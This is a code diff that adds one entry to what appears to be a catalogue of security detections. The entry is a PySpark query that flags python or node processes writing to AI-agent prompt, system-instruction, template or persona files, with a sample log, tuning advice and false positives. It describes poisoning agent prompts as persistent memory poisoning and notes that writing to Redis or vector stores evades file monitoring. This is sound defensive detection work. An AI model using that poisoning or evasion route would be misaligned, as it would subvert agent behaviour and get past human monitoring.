+    pyspark: `result = spark.sql("""
+    SELECT timestamp, computer_name AS host, user,
+           image, target_filename,
+           'asi06-oci-linux-002' AS detection_id,
+           'AI Agent Modifying Prompt Template Files' AS detection_name,
+           'medium' AS severity
+    FROM linux_audit_events
+    WHERE (image LIKE '%/python'
+           OR image LIKE '%/python3'
+           OR image LIKE '%/node')
+      AND (LOWER(target_filename) LIKE '%prompt%'
+           OR LOWER(target_filename) LIKE '%system_instruction%'
+           OR LOWER(target_filename) LIKE '%template%'
+           OR LOWER(target_filename) LIKE '%persona%')
+""")`,
+    sampleLogs: [
+      `{"timestamp":"2025-01-10T23:14:07Z","computer_name":"oci-agent-01","user":"llm_agent","image":"/usr/bin/python3","target_filename":"/opt/agent/config/system_instruction.txt","operation":"write"}`,
+    ],
+    requiredFields: ["image", "target_filename", "user", "computer_name"],
+    falsePositives: [
+      "Legitimate agent configuration updates through authorized deployment pipelines",
+      "Template editing tools used by administrators",
+    ],
+    tuningGuidance:
+      "Apply file integrity monitoring (FIM) to all agent prompt and configuration files. Writes outside of authorized deployment windows should generate alerts. Make agent configuration files read-only at the OS level where possible.",
+    deploymentNotes:
+      "Requires file write auditing via auditd or inotify-based monitoring. Combine with file integrity monitoring tools for comprehensive coverage.",
+    evasionConsiderations:
+      "Context poisoning may occur by writing to in-memory stores (Redis, vector databases) rather than files, bypassing filesystem-based monitoring.",
+    problemStatement:
+      "System prompts and persona files define the core behavior boundaries of AI agents. Unauthorized modification of these files can persistently alter agent behavior across all subsequent sessions — a stealthy form of memory poisoning.",
+  },
 ];
 
 export const getDetectionById = (id: string) =>
